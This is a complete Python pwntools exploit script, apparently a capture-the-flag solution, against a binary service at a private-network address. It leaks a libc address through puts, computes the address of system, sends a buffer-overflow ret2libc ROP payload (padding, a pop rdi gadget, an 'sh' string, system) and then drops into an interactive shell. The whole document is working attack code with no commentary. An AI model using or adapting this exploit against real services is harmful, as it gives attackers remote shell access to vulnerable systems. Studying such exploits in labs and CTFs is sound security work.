#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 9999

r = remote(host,port)

r.recvuntil(":")
r.sendline("601018")
r.recvuntil(":")
puts = int(r.recvuntil("\n").strip(),16)
puts_off =0x6f690
system_off = 0x45390
libc = puts - puts_off
system = libc + system_off
pop_rdi = 0x0000000000400843
sh = 0x4003c4
r.recvuntil(":")
payload = "a"*280 + p64(pop_rdi) + p64(sh) + p64(system)

r.sendline(payload)
r.interactive()
